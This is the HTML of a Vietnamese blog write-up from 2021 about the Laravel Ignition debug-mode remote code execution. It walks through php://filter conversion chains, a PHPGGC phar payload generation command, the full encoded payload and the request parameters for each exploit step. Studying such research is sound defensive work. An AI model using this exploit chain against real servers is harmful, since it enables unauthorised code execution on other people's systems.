<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Laravel &lt;= v8.4.2 debug mode: Remote code execution - Chiếm quyền điều khiển máy thằng bạn đang code PHP | minhtuanact|Blog - Keep a flame in the rain!</title><meta name=keywords content="Happy New Year,RCE,Laravel,PHP"><meta name=description content="Tản mạn &ldquo;Hằng năm cứ vào cuối đông, lá ngoài đường rụng nhiều và trên không có những đám mây bàng bạc, lòng tôi lại nao nức những kỷ niệm hoang mang.
Tôi không thể nào quên được những cảm giác trong sáng ấy nảy nở trong lòng tôi như mấy cành hoa tươi mỉm cười giữa bầu trời quang đãng.
Những ý tưởng ấy tôi chưa lần nào ghi lên giấy, vì hồi ấy tôi không biết ghi và ngày nay tôi không nhớ hết."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/laravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Laravel <= v8.4.2 debug mode: Remote code execution - Chiếm quyền điều khiển máy thằng bạn đang code PHP"><meta property="og:description" content="Tản mạn &ldquo;Hằng năm cứ vào cuối đông, lá ngoài đường rụng nhiều và trên không có những đám mây bàng bạc, lòng tôi lại nao nức những kỷ niệm hoang mang.
Tôi không thể nào quên được những cảm giác trong sáng ấy nảy nở trong lòng tôi như mấy cành hoa tươi mỉm cười giữa bầu trời quang đãng.
Những ý tưởng ấy tôi chưa lần nào ghi lên giấy, vì hồi ấy tôi không biết ghi và ngày nay tôi không nhớ hết."><meta property="og:type" content="article"><meta property="og:url" content="https://minhtuanact.github.io/posts/laravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php/"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-01-14T08:59:20+07:00"><meta property="article:modified_time" content="2021-01-14T08:59:20+07:00"><meta property="og:site_name" content="minhtuanact|Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Laravel <= v8.4.2 debug mode: Remote code execution - Chiếm quyền điều khiển máy thằng bạn đang code PHP"><meta name=twitter:description content="Tản mạn &ldquo;Hằng năm cứ vào cuối đông, lá ngoài đường rụng nhiều và trên không có những đám mây bàng bạc, lòng tôi lại nao nức những kỷ niệm hoang mang.
Tôi không thể nào quên được những cảm giác trong sáng ấy nảy nở trong lòng tôi như mấy cành hoa tươi mỉm cười giữa bầu trời quang đãng.
Những ý tưởng ấy tôi chưa lần nào ghi lên giấy, vì hồi ấy tôi không biết ghi và ngày nay tôi không nhớ hết."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Laravel \u003c= v8.4.2 debug mode: Remote code execution - Chiếm quyền điều khiển máy thằng bạn đang code PHP","item":"https://minhtuanact.github.io/posts/laravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Laravel ","name":"Laravel ","description":"Tản mạn \u0026ldquo;Hằng năm cứ vào cuối đông, lá ngoài đường rụng nhiều và trên không có những đám mây bàng bạc, lòng tôi lại nao nức những kỷ niệm hoang mang.\nTôi không thể nào quên được những cảm giác trong sáng ấy nảy nở trong lòng tôi như mấy cành hoa tươi mỉm cười giữa bầu trời quang đãng.\nNhững ý tưởng ấy tôi chưa lần nào ghi lên giấy, vì hồi ấy tôi không biết ghi và ngày nay tôi không nhớ hết.","keywords":["Happy New Year","RCE","Laravel","PHP"],"articleBody":"Tản mạn “Hằng năm cứ vào cuối đông, lá ngoài đường rụng nhiều và trên không có những đám mây bàng bạc, lòng tôi lại nao nức những kỷ niệm hoang mang.\nTôi không thể nào quên được những cảm giác trong sáng ấy nảy nở trong lòng tôi như mấy cành hoa tươi mỉm cười giữa bầu trời quang đãng.\nNhững ý tưởng ấy tôi chưa lần nào ghi lên giấy, vì hồi ấy tôi không biết ghi và ngày nay tôi không nhớ hết. Nhưng mỗi lần thấy các bạn viết những nghiên cứu của bản thân mình để chia sẻ cho mọi người, lòng tôi lại tưng bừng rộn rã.\nBuổi sáng mai hôm ấy, một buổi mai đầy sương thu và gió lạnh. Tôi âu yếm ngồi lên chiếc Sirius quen thuộc rồi đi trên những con phố Hà Nội đầy tấp nập. Con đường này tôi đã quen đi lại lắm lần, nhưng lần này tự nhiên tôi thấy lạ. Cảnh vật chung quanh tôi đều thay đổi, vì chính lòng tôi đang có sự thay đổi lớn: Hôm nay tôi đi làm”\nGiữa cái thời tiết rét buốt đến độ mỗi sáng người ta sẽ đánh vật với lý trí của bản thân: dậy chuẩn bị đi làm hay xin Inlate 2 tiếng để đi ngủ thêm. Còn tôi thì vẫn như một thói quen, 6h sáng chiếc Google Home Mini đánh thức tôi dậy bằng bản nhạc “Giá như” của Chillies, một bài mà tôi rất thích trong thời gian gần đây. Trước khi rời khỏi chiếc chăn ấm của mình, đầu tiên tôi sẽ tìm cái điện thoại của mình và xem ngày hôm nay thế giới đã thay đổi được những gì, lướt 1 dạo thấy một bài Writeup vừa mới được public không lâu ở Laravel . Tôi dần dần chú ý vào tiêu đề của bài viết và đọc một chút nội dung trong này. Chà! một bài viết thật công phu, sáng nay tôi lại có thứ mới để nghiên cứu rồi. Vậy là tôi chuẩn bị lên đường đi làm với một cảm xúc thật tươi vui. Hôm nay tôi đi làm.\n Tản mạn vậy đủ rồi, bài viết này là bài viết về kỹ thuật chứ không phải bài văn xuôi đâu :D\n  Tất cả nội dung trong bài viết này được tham khảo trong bài viết https://www.ambionics.io/blog/laravel-debug-rce\n Laravel Làm cái video cho nó tín cái đã {@embed: https://vimeo.com/500275499}\nTrong quá trình đi test các dự án của khách hàng, mình thường xuyên thấy cái mode debug này được bật, ngày xưa còn lấy được cả APP_KEYS rồi RCE luôn server test, được ngay cái báo cáo xịn, tuy nhiên đấy là câu chuyện của Laravel 5 trở xuống thôi, còn bây giờ từ Laravel 6 trở lên thì nó sử dụng Ignition để hiển thị debug. Ignition được bật tự động trong Laravel 6 trở lên.\nIgnition Ở đây mình có 1 file hello.blade.php có nội dung là {{ $username }}, nếu sử dụng một biến mà không được define thì nó sẽ trả về một lỗi như hình bên trên. Khi ta click vào Make variable Optional thì nó sẽ tự động replace {{ $username }} thành {{ $username ? '' }}. Kiểm tra log thì ta thấy được request như sau:\nNhững researcher ở Ambionics đã nghĩ đến các sử dụng chính tính năng này để có thể thay đổi nội dung của file bất kỳ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this-makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); // [1] $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2] $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this-generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { // [3] return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE \u0026\u0026 $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } ... }   Sau khi đọc được file path truyền vào [1] và thay thế $variableName thành variableName ?? \" cả file ban đầu và file mới đều sẽ được mã hóa [2] và file ban đầu được thay thế bằng nội dung mới của nó. Nếu không, makeOptional sẽ trả về false [3] và file mới sẽ không được ghi. Do đó, không thể làm được gì nhiều khi sử dụng variableName.\nInput variable duy nhất còn lại là viewFile, từ đoạn code trên có thể viết lại đoạn code rút gọn như sau:\n1 2  $contents = file_get_contents($parameters['viewFile']); file_put_contents($parameters['viewFile'], $contents);   Đoạn code này lấy nội dung lấy từ viewFile rồi chèn trở lại viewFile. Chẳng để làm gì cả đúng không :upside_down_face:\nLog file to PHAR PHP wrappers: changing a file Có một kỹ thuật được trình bày bởi Orange Tsai http://blog.orange.tw/2018/10/. Nó sử dụng php:filter để thay đổi nội dung của file trước khi được trả về. Và bây giờ có thể sử dụng kỹ thuật này để chuyển nội dung của file bằng cách sử dụng cách sau:\n1 2 3  $ echo test | base64 | base64  /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K   1 2 3 4 5  $f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt'; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents($f); # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents($f, $contents);   1 2  $ cat /path/to/file.txt test   Vậy có thể sửa đổi nội dung file theo cách này, tuy nhiên chúng ta cần phải sửa đổi nội dung file chỉ được với 1 dòng duy nhất\n1 2 3 4  # To base64-decode once, use: $f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt'; # OR $f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt';   Thậm chí file chứa những charset không nằm trong base64 (badchars) thì PHP bỏ qua những badchars này và vẫn decode như bình thường\n1  $ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!'  /path/to/file.txt   1 2 3  $f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt'; $contents = file_get_contents($f); file_put_contents($f, $contents);   1 2  $ cat /path/to/file.txt test   Vậy giờ chúng ta cần phải tìm được 1 file mà mình có thể control được thông tin ghi vào file, ở đây chính là file log mặc định của Laravel\nWrite the log file Theo mặc định, file log của Laravel chứa mọi lỗi PHP và stack trace, được lưu trong storage/log/laravel.log. Cố gắng tạo ra lỗi để được ghi lỗi vào file log =)).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  [2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {\"exception\":\"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution-makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution-run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController-__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline-Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline-then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel-sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel-handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...') #37 {main} \"}   Vậy là chúng ta có thể có thể đưa nội dung tùy ý vào một file. Sau đó chuyển đổi file log thành file PHAR và sử dụng phar để RCE :smiley:\nTuy rằng nghe có vẻ dễ như vậy nhưng thật ra có rất nhiều vấn đề\nConvert file Như ở trên, ta biết rằng PHP sẽ bỏ qua bất kỳ badchar nào khi sử dụng base64-decoding. Điều này đúng, ngoại trừ một character: =. Nếu bạn sử dụng base64-decode filter một chuỗi có chứa = ở giữa, PHP sẽ tạo ra lỗi và không trả về kết quả nào.\nChúng ta có thể khắc phục được điều này nếu chúng ta có thể control được nội dung file đó. Tuy nhiên, payload chúng ta đưa vào file log chỉ là một phần rất nhỏ của nó. Ở mỗi đoạn log sẽ có 1 đoạn prefix (timestamp) - Payload - suffix (stack strace). Hơn nữa, payload lại xuất hiện2 lần trong file log như ví dụ dưới đây:\n1 2 3 4  [2021-01-13 11:09:46] local.ERROR: file_get_contents(PAYLOAD): failed to open stream: No such file or directory {\"exception\":\" [object] (ErrorException(code: 0): file_get_contents(PAYLOAD): failed to open stream: No such file or directory at /var/www/html/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-handleError(2, 'file_get_conten...', '/var/www/html/v...', 75, Array)   Sau nhiều lần thử nghiệm, những researcher của Ambionics đã tìm ra cách để loại bỏ các phần dư thừa để lấy được Payload. Ví dụ với trường hợp như sau:\n1  [prefix]PAYLOAD[midfix]PAYLOAD[suffix]   Cách mà họ sử dụng là sử dụng chuyển đổi bảng mã UTF-16 sang UTF-8. Vì cứ 2 byte thì sẽ được 1 char theo mã UTF-16 nên convert sang UTF-8 thì P\\0 - P. Còn các cặp 2 byte ở prefix, midfix, suffix sẽ bị convert thành junk char giống như dưới đây (và phần junk này sau đó sẽ bị loại bỏ ở bước base64 decoding):\n1  echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]'  /tmp/test.txt   1 2  php  echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); 卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠   Ok, giờ ta đã giữ được nội dung của payload, bước tiếp theo là loại bỏ những ký tự nào không phải là ASCII là xong. Tuy nhiên có một vấn đề là nội dung Payload lại hiển thị 2 lần, chúng ta cần phải loại bỏ 1 cái đi mới đúng cấu trúc của file PHAR. Để giải quyết vấn đề này ta lại nhớ lại là UTF-16 làm việc với hai byte, nên chỉ cần thêm 1 byte vào phần giữa Payload 1 và Payload 2 (như dưới đây là thêm X vào sau D\\0) thì byte aligment của Payload thứ 2 sẽ bị lệch, dẫn đến Payload 2 bị convert thành junk chars:\n1  echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]'  /tmp/test.txt   1 2  php  echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); 卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠   Vậy, kết luận chúng ta sẽ có get chain cuối cùng là:\n1  viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log   Complete exploit steps Bước 1: Tạo PHPGGC payload và encode nó theo format trên: 1  php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/./\\0=00/g'   Chú ý, chỉnh sửa một chút ở phía đầu ra Payload, thay thế dấu == thành =3D. Mình cũng k hiểu vì sao Ambionics chạy được với 2 dấu = ở cuối payload, mình chạy toàn bị lỗi\n1  Warning: file_get_contents(): stream filter (convert.quoted-printable-decode): invalid byte sequence in php shell code on line 1   Sau một hồi anh em debug thì phát hiện ra phải sửa 1 dấu = thành 3D thì chạy ngon nghẻ, nếu thấy xuất hiện lỗi\n1  Warning: file_get_contents(): iconv stream filter (\"utf-16le\"=\"utf-8\"): invalid multibyte sequence in php shell code on line 1   thì phải đệm thêm 1 byte =00 vào để decode được nhé.\nBước 2: Xoá log 1  viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log    Chẳng hiểu kiểu gì bạn với sếp mình dùng cách này xoá được log mà mình phải dùng cách khác để xoá log .Bước 3: Tạo log chứa payload 1  viewFile: P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00F=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00u=00A=00g=00A=00A=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00T=00z=00o=00y=00O=00T=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00E=00J=001=00Z=00m=00Z=00l=00c=00k=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00c=006=00e=003=00M=006=00M=00T=00A=006=00I=00g=00A=00q=00A=00G=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=000=004=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00f=00Q=00U=00A=00A=00A=00B=00k=00d=00W=001=00t=00e=00Q=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00H=00R=00l=00c=003=00R=000=00Z=00X=00N=000=00C=00Q=00/=006=00k=00s=000=00G=00x=00r=00d=00l=00r=00x=00x=007=00q=00r=009=003=00V=00/=00X=00T=002=00F=00k=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00   Bước 4: Convert file log sang file PHAR 1  viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log   Chú ý, ở bước này có thể sử dụng utf-16le hoặc utf-16be, tuỳ theo các nào được nhé\n Mình sử dụng cách này để xóa log, khi mà nó hoạt động chính xác, sẽ k tìm thấy đoạn base64 nào cả nên output trả về là không có gì, thành ra xóa được log. Gửi request 1 lần k được thì thử vài lần xem sao nhé.\n Bước 5: Chạy PHAR deserialization 1  viewFile: phar:///path/to/storage/logs/laravel.log   Và ta được thành quả\nExploit PoC Nếu ai muốn thử nghiệm thì đợi mình build xong Docker rồi chạy nhé, tạm thời dùng tạm cái này đã nha\n1 2 3 4 5 6  $ git clone https://github.com/laravel/laravel.git $ cd laravel $ git checkout e849812 $ composer install $ composer require facade/ignition==2.5.1 $ php artisan serve   Chúng mình có viết xong PoC exploit ở đây, hi vọng có ích cho mọi người ;)\nGithub: https://github.com/khanhnv-2091/laravel-8.4.2-rce\nCảm ơn anh @vigov5 và @com0tf3 đã hỗ trợ nghiên cứu CVE này.\nTham khảo  https://www.ambionics.io/blog/laravel-debug-rce   Bài chưa hết ở đây nhớ, còn phần 2 :D\n ","wordCount":"2086","inLanguage":"en","datePublished":"2021-01-14T08:59:20+07:00","dateModified":"2021-01-14T08:59:20+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/laravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class=post-title>Laravel &lt;= v8.4.2 debug mode: Remote code execution - Chiếm quyền điều khiển máy thằng bạn đang code PHP</h1><div class=post-meta><span title="2021-01-14 08:59:20 +0700 +0700">January 14, 2021</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#t%e1%ba%a3n-m%e1%ba%a1n aria-label="Tản mạn">Tản mạn</a></li><li><a href=#laravel--v842-debug-mode-remote-code-execution 